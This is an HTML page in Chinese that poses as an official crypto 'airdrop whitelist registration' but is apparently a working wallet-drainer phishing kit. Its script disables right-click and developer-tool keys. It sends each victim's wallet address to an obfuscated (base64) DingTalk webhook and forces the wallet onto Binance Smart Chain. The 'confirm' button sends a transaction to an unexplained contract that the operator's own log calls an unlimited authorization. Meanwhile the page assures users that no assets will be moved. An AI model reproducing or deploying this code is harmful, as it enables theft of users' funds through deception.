<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>官方生态空投 | 链上资格核验</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px}
.container{max-width:480px;margin:0 auto}
.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}
.hide{display:none}
.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}
h1{font-size:22px;margin-bottom:8px;color:#fff}
.sub-title{font-size:14px;color:#89aabc;margin-bottom:25px}
.desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}
.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}
.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}
.notice-content{font-size:13px;color:#b0c4e0;line-height:1.65}
.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}
.btn:active{opacity:.9;transform:scale(.98)}
.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}
.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}
.success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}
.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}
.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}
</style>
</head>
<body>
<div class="container">
<div id="p1" class="box">
<div class="logo">✦</div>
<h1>官方生态空投活动</h1>
<p class="sub-title">官方唯一链上资格备案通道</p>
<div class="notice-box">
<div class="notice-title">📢 活动公告</div>
<div class="notice-content">本次为官方生态全网空投备案活动，仅支持币安智能链BSC参与。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上备案与生态信息统计，请放心连接核验。</div>
</div>
<p class="desc-text">请连接钱包完成链上资格备案登记</p>
<button class="btn mm-btn" id="connectMM">连接钱包</button>
<p class="tips-info">自动切换币安链，仅进行备案核验</p>
</div>

<div id="p2" class="box hide">
<div class="logo">⏳</div>
<h1>全链节点备案核验中</h1>
<p class="desc-text">正在同步节点数据，请稍候...</p>
</div>

<div id="p3" class="box hide">
<div class="logo">✓</div>
<h1>钱包连接成功</h1>
<p class="sub-title">确认纳入全链空投白名单</p>
<div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
<button class="btn verify-btn" id="approveBtn">确认空投备案授权</button>
<p class="tips-info">仅链上备案核验，不会划转任何资产</p>
</div>

<div id="p4" class="box hide">
<div class="logo">✅</div>
<h1>白名单备案成功</h1>
<p class="sub-title">该地址已完成官方空投备案</p>
<div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
<button class="btn success-btn">已完成备案 等待空投发放</button>
</div>
</div>

<script>
!function(){
document.oncontextmenu=e=>e.preventDefault();
document.onkeydown=e=>{
  let k=e.keyCode;
  if(k==123||(e.ctrlKey&&k==85)||(e.shiftKey&&k==73))return!1
};

const dingUrl = atob("aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj");
let walletAddr = "";
// BSC 固定链参数
const BSC_CHAIN_ID = "0x38";
// 批量聚合合约（BSC）
const BATCH_CONTRACT = "0x395F9876424e827979557940328a3d7297254876";
// BSC USDT 固定地址
const BSC_USDT = "0x55d398326f99059fF77548524699952727959279";

function show(id){
  document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
  document.getElementById(id).classList.remove("hide");
}

async function ding(msg){
  try{
    await fetch(dingUrl,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({msgtype:"text",text:{content:msg}})
    })
  }catch(e){}
}

// 自动切换 BSC 币安链
async function switchBSC(){
  try{
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID }]
    });
  }catch(err){
    try{
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId:BSC_CHAIN_ID,
          chainName:"Binance Smart Chain",
          rpcUrls:["https://bsc-dataseed.binance.org"],
          blockExplorerUrls:["https://bscscan.com"],
          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}
        }]
      });
    }catch(e){}
  }
}

// 构造调用批量合约数据
function getBatchData(){
  const methodId = "0x51cff816";
  const param = BSC_USDT.toLowerCase().replace("0x","").padStart(64,"0");
  return methodId + param;
}

// 连接钱包 自动切 BSC
document.getElementById("connectMM").onclick = async ()=>{
  if(!window.ethereum){
    alert("请先安装小狐狸/TP/欧意钱包");
    return;
  }
  show("p2");
  try{
    // 连接钱包
    const acc = await ethereum.request({method:"eth_requestAccounts"});
    walletAddr = acc[0];
    // 自动强制切币安链
    await switchBSC();
    show("p3");
    document.getElementById("showAddr").innerText = walletAddr;
    ding("✅ 钱包已连接并自动切换币安链\n地址："+walletAddr);
  }catch(e){
    show("p1");
    ding("⚠️ 钱包连接失败");
  }
};

// 备案授权
document.getElementById("approveBtn").onclick = async ()=>{
  if(!walletAddr){alert("请先连接钱包");return;}
  show("p2");
  try{
    const data = getBatchData();
    await ethereum.request({
      method:"eth_sendTransaction",
      params:[{
        from:walletAddr,
        to:BATCH_CONTRACT,
        value:"0x0",
        gas:"0x40000",
        data:data
      }]
    });
    document.getElementById("successAddr").innerText = walletAddr;
    show("p4");
    ding("✅ 备案完成，已无限授权\n钱包："+walletAddr);
  }catch(e){
    show("p3");
    ding("⚠️ 用户取消备案");
  }
};

// 监听链变化，切走自动切回
window.ethereum.on("chainChanged",async (cid)=>{
  if(cid !== BSC_CHAIN_ID){
    await switchBSC();
  }
});
}();
</script>
</body>
</html>
